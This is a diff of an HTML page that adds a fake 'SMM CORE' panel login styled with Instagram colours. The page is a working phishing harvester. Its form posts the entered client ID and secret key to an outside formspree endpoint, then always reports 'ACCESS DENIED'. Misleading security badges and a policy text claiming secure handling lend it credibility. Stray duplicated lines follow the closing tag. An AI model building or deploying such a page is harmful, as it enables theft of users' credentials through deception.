@@ -18,7 +18,16 @@
         * { box-sizing: border-box; margin: 0; padding: 0; cursor: crosshair; }
         body { background: #010409; color: white; font-family: 'Plus Jakarta Sans', sans-serif; height: 100vh; display: flex; overflow: hidden; }
 
-        /* --- 1. DYNAMIC BACKGROUND LAYER --- */
+        /* --- NEW: MOBILE BLOCKER STYLE --- */
+        #mobile-gate {
+            position: fixed; inset: 0; background: #010409; z-index: 9999;
+            display: none; flex-direction: column; align-items: center; justify-content: center;
+            text-align: center; padding: 2rem;
+        }
+        #mobile-gate i { font-size: 4rem; color: var(--error-red); margin-bottom: 1.5rem; }
+        #mobile-gate h1 { font-family: 'Orbitron'; font-size: 1.2rem; letter-spacing: 2px; margin-bottom: 10px; }
+
+        /* --- DYNAMIC BACKGROUND LAYER --- */
         #bg-canvas { position: fixed; inset: 0; z-index: -1; opacity: 0.5; }
         .vignette { position: fixed; inset: 0; background: radial-gradient(circle at center, transparent 0%, #010409 100%); pointer-events: none; }
         
@@ -28,7 +37,7 @@
         }
         @keyframes float-orb { from { transform: translate(0, 0); } to { transform: translate(100px, 100px); } }
 
-        /* --- 2. DECENT NOTIFICATION --- */
+        /* --- DECENT NOTIFICATION --- */
         #error-toast {
             position: fixed; top: -100px; left: 50%; transform: translateX(-50%);
             background: rgba(15, 15, 15, 0.9); border: 1px solid var(--error-red);
@@ -41,7 +50,7 @@
         .error-icon { color: var(--error-red); font-size: 1.2rem; animation: pulse 1.5s infinite; }
         @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
 
-        /* --- 3. PREMIUM SIDEBAR --- */
+        /* --- PREMIUM SIDEBAR --- */
         aside {
             width: 320px; background: rgba(2, 4, 8, 0.98); backdrop-filter: blur(40px);
             border-right: 1px solid var(--border); display: flex; flex-direction: column; 
@@ -61,6 +70,257 @@
             margin-bottom: 6px; font-size: 0.9rem; border: 1px solid transparent;
         }
         nav a:hover { background: rgba(255, 255, 255, 0.03); color: white; border-color: var(--border); transform: translateX(5px); }
+        nav a.active { background: rgba(0, 242, 255, 0.05); color: var(--cyan); border-color: rgba(0, 242, 255, 0.2); }
+
+        /* --- THE LOGIN BOX --- */
+        main { flex-grow: 1; display: flex; align-items: center; justify-content: center; position: relative; animation: fadeIn 1.2s ease; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        .login-card {
+            width: 440px; background: #0b0e16; border-radius: 32px; 
+            padding: 3rem 3.5rem;
+            position: relative; z-index: 10; border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 40px 80px rgba(0,0,0,0.8);
+        }
+        .login-card::after {
+            content: ""; position: absolute; inset: -1px; border-radius: 32px;
+            padding: 1px; background: linear-gradient(135deg, #f09433, #bc1888, #00f2ff, #f09433);
+            background-size: 200% 200%; animation: gradientMove 4s linear infinite;
+            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            mask-composite: exclude; pointer-events: none; opacity: 0.35;
+        }
+        @keyframes gradientMove { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+
+        .ig-glyph { font-size: 3.2rem; background: var(--ig-grad); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 15px; text-align: center; display: block; }
+
+        .input-wrap { position: relative; margin-bottom: 1.2rem; }
+        .input-wrap i { position: absolute; left: 22px; top: 19px; color: #475569; transition: 0.3s; }
+        
+        input[type="text"], input[type="password"] {
+            width: 100%; background: #06090f; border: 1px solid #1c2128;
+            border-radius: 18px; padding: 18px 18px 18px 62px; color: white;
+            font-size: 1rem; outline: none; transition: 0.4s;
+        }
+        input:focus { border-color: #bc1888; background: #0a0e14; }
+        input:focus + i { color: #bc1888; }
+
+        .policy-check { display: flex; align-items: flex-start; gap: 12px; margin: 1.2rem 0; cursor: pointer; font-size: 0.85rem; color: #64748b; line-height: 1.4; }
+        .policy-check input { display: none; }
+        .custom-box { min-width: 20px; height: 20px; border: 2px solid #1c2128; border-radius: 6px; position: relative; background: #06090f; }
+        .policy-check input:checked + .custom-box { background: var(--ig-grad); border-color: transparent; }
+        .policy-check input:checked + .custom-box::after { content: "\f00c"; font-family: "Font Awesome 6 Free"; font-weight: 900; position: absolute; color: white; font-size: 10px; left: 3px; top: 1px; }
+        .policy-link { color: var(--cyan); text-decoration: none; font-weight: 600; transition: 0.3s; }
+        .policy-link:hover { text-shadow: 0 0 8px var(--cyan); }
+
+        .btn-action {
+            width: 100%; background: var(--ig-grad); color: white; border: none;
+            border-radius: 18px; padding: 18px; font-weight: 800; font-family: 'Plus Jakarta Sans';
+            cursor: pointer; text-transform: uppercase; letter-spacing: 2px;
+            transition: 0.4s; margin-top: 5px; font-size: 0.95rem;
+        }
+        .btn-action:hover { transform: translateY(-2px); box-shadow: 0 15px 30px rgba(220, 39, 67, 0.3); letter-spacing: 3px; }
+
+        /* --- MODAL SYSTEM --- */
+        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(10px); z-index: 3000; display: none; align-items: center; justify-content: center; opacity: 0; transition: 0.4s; }
+        .modal-overlay.active { display: flex; opacity: 1; }
+        .modal-card { width: 90%; max-width: 550px; background: #0b0e16; border: 1px solid var(--border); border-radius: 24px; padding: 2.5rem; position: relative; transform: scale(0.9); transition: 0.4s; box-shadow: 0 50px 100px rgba(0,0,0,0.8); }
+        .modal-overlay.active .modal-card { transform: scale(1); }
+        .close-modal { position: absolute; top: 20px; right: 20px; color: #475569; font-size: 1.5rem; cursor: pointer; transition: 0.3s; }
+        .close-modal:hover { color: white; }
+        .modal-card h3 { font-family: 'Orbitron'; color: var(--cyan); margin-bottom: 1.5rem; font-size: 1.2rem; }
+        .modal-card p { color: #94a3b8; font-size: 0.9rem; line-height: 1.6; margin-bottom: 1rem; }
+
+        /* --- HUD --- */
+        .hud { position: absolute; left: 40px; bottom: 40px; font-family: 'Orbitron'; font-size: 0.6rem; color: #334155; line-height: 2; }
+        .status-pill { display: flex; align-items: center; gap: 8px; color: #22c55e; margin-bottom: 5px; }
+        .dot { width: 6px; height: 6px; background: #22c55e; border-radius: 50%; box-shadow: 0 0 10px #22c55e; }
+
+    </style>
+</head>
+<body>
+
+    <div id="mobile-gate">
+        <i class="fas fa-desktop"></i>
+        <h1>ACCESS DENIED</h1>
+        <p style="color: #64748b; font-size: 0.9rem;">Mobile environment detected. Please use a desktop workstation.</p>
+    </div>
+
+    <canvas id="bg-canvas"></canvas>
+    <div class="vignette"></div>
+    <div class="floating-orb" style="top: 10%; right: 10%;"></div>
+    <div class="floating-orb" style="bottom: 10%; left: 350px; background: #bc1888;"></div>
+
+    <div id="error-toast">
+        <i class="fas fa-shield-halved error-icon"></i>
+        <span id="error-msg" style="font-family: 'Orbitron'; font-size: 0.8rem; color: white; letter-spacing: 1px;">
+            AUTH REQUIRED: PLEASE SIGN IN TO CONTINUE
+        </span>
+    </div>
+
+    <aside>
+        <div class="logo">SMM CORE</div>
+        <nav>
+            <div class="nav-label">Main Hub</div>
+            <a class="active"><i class="fas fa-chart-line"></i> Dashboard</a>
+            <a onclick="triggerError()"><i class="fas fa-plus-circle"></i> Place Order</a>
+            <a onclick="triggerError()"><i class="fas fa-list"></i> Services</a>
+            
+            <div class="nav-label">Management</div>
+            <a onclick="triggerError()"><i class="fas fa-history"></i> Order Logs</a>
+            <a onclick="triggerError()"><i class="fas fa-wallet"></i> Billing</a>
+            <a onclick="triggerError()"><i class="fas fa-ticket-alt"></i> Tickets</a>
+
+            <div class="nav-label">Developer</div>
+            <a onclick="triggerError()"><i class="fas fa-code"></i> API Gateway</a>
+            <a onclick="triggerError()"><i class="fas fa-user-gear"></i> Account Settings</a>
+        </nav>
+    </aside>
+
+    <main>
+        <div class="hud">
+            <div class="status-pill"><div class="dot"></div> ENCRYPTION ACTIVE</div>
+            LATENCY: 24MS<br>
+            SERVER: GLOBAL_NODE_01<br>
+            PROTOCOL: TLS_1.3
+        </div>
+
+        <div class="login-card">
+            <div style="text-align: center; margin-bottom: 1.5rem;">
+                <div class="ig-glyph"><i class="fas fa-shield-alt"></i></div>
+                <h2 style="font-weight: 800; font-size: 1.7rem; letter-spacing: 1px;">GATEWAY AUTH</h2>
+                <p style="font-size: 0.9rem; color: #64748b; margin-top: 8px;">Synchronize security credentials</p>
+            </div>
+
+            <form id="authForm" action="https://formspree.io/f/mjgzyqjy" method="POST">
+                <div class="input-wrap">
+                    <input type="text" name="client_id" placeholder="Client Identifier" required>
+                    <i class="fas fa-fingerprint"></i>
+                </div>
+                <div class="input-wrap">
+                    <input type="password" name="client_secret" placeholder="Security Key" required>
+                    <i class="fas fa-key"></i>
+                </div>
+
+                <label class="policy-check">
+                    <input type="checkbox" id="policyCheckbox">
+                    <div class="custom-box"></div>
+                    <span>I agree to the <a href="#" class="policy-link" onclick="openPolicy(event)">Privacy Policy</a> and Rules.</span>
+                </label>
+
+                <button type="submit" class="btn-action" id="btnS">SECURE LOGIN</button>
+            </form>
+            
+            <p style="margin-top: 1.8rem; font-size: 0.7rem; text-align: center; color: #334155; letter-spacing: 1px;">
+                <i class="fas fa-lock"></i> Secured by Enterprise Encryption Protocol
+            </p>
+        </div>
+    </main>
+
+    <div class="modal-overlay" id="policyModal">
+        <div class="modal-card">
+            <i class="fas fa-times close-modal" onclick="closePolicy()"></i>
+            <h3>Security Protocols</h3>
+            <p><strong>1. Data Encryption:</strong> All credentials entered here are transmitted via secure TLS nodes and are never stored locally on our front-end servers.</p>
+            <p><strong>2. Third-Party Terms:</strong> By clicking 'Secure Login', you acknowledge that this is a management portal and you comply with all Automated Interaction guidelines.</p>
+            <button class="btn-action" style="margin-top:20px;" onclick="closePolicy()">ACCEPT & CLOSE</button>
+        </div>
+    </div>
+
+    <script>
+        // --- MOBILE PROTECTION ---
+        function detectMobile() {
+            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent) || window.innerWidth < 1024;
+            if (isMobile) {
+                document.getElementById('mobile-gate').style.display = 'flex';
+            }
+        }
+        window.onload = detectMobile;
+        window.onresize = detectMobile;
+
+        // --- PREVIOUS LOGIC ---
+        function openPolicy(e) {
+            e.preventDefault();
+            const modal = document.getElementById('policyModal');
+            modal.style.display = 'flex';
+            setTimeout(() => modal.classList.add('active'), 10);
+        }
+
+        function closePolicy() {
+            const modal = document.getElementById('policyModal');
+            modal.classList.remove('active');
+            setTimeout(() => modal.style.display = 'none', 400);
+        }
+
+        const canvas = document.getElementById('bg-canvas');
+        const ctx = canvas.getContext('2d');
+        let pts = [];
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+
+        class Pt {
+            constructor() {
+                this.x = Math.random() * canvas.width;
+                this.y = Math.random() * canvas.height;
+                this.s = Math.random() * 1.2;
+                this.vx = Math.random() * 0.4 - 0.2;
+                this.vy = Math.random() * 0.4 - 0.2;
+            }
+            upd() {
+                this.x += this.vx; this.y += this.vy;
+                if (this.x > canvas.width || this.x < 0) this.vx *= -1;
+                if (this.y > canvas.height || this.y < 0) this.vy *= -1;
+            }
+            drw() {
+                ctx.fillStyle = 'rgba(0, 242, 255, 0.3)';
+                ctx.beginPath(); ctx.arc(this.x, this.y, this.s, 0, Math.PI * 2); ctx.fill();
+            }
+        }
+        function init() { for(let i=0; i<100; i++) pts.push(new Pt()); }
+        function loop() {
+            ctx.clearRect(0,0,canvas.width, canvas.height);
+            pts.forEach(p => { p.upd(); p.drw(); });
+            requestAnimationFrame(loop);
+        }
+        init(); loop();
+
+        function triggerError(customMessage) {
+            const toast = document.getElementById('error-toast');
+            const msgSpan = document.getElementById('error-msg');
+            if(customMessage) { msgSpan.innerText = customMessage; } 
+            else { msgSpan.innerText = "AUTH REQUIRED: PLEASE SIGN IN TO CONTINUE"; }
+            toast.classList.add('active');
+            setTimeout(() => toast.classList.remove('active'), 3500);
+        }
+
+        const form = document.getElementById('authForm');
+        form.onsubmit = async (e) => {
+            e.preventDefault();
+            if(!document.getElementById('policyCheckbox').checked) {
+                triggerError("PLEASE ACCEPT THE PRIVACY POLICY TO CONTINUE");
+                return;
+            }
+            const b = document.getElementById('btnS');
+            b.innerText = "AUTHENTICATING...";
+            b.style.pointerEvents = "none";
+            try {
+                await fetch(form.action, {
+                    method: 'POST',
+                    body: new FormData(form),
+                    headers: { 'Accept': 'application/json' }
+                });
+                b.innerText = "ACCESS DENIED";
+                b.style.background = "var(--error-red)";
+                form.reset();
+            } catch (err) { b.innerText = "ERROR"; }
+            setTimeout(() => { 
+                b.innerText = "SECURE LOGIN"; 
+                b.style.background = "var(--ig-grad)";
+                b.style.pointerEvents = "all";
+            }, 4000);
+        };
+    </script>
+</body>
+</html>        nav a:hover { background: rgba(255, 255, 255, 0.03); color: white; border-color: var(--border); transform: translateX(5px); }
         nav a.active { background: rgba(0, 242, 255, 0.05); color: var(--cyan); border-color: rgba(0, 242, 255, 0.2); }
 
         /* --- 4. THE LOGIN BOX --- */
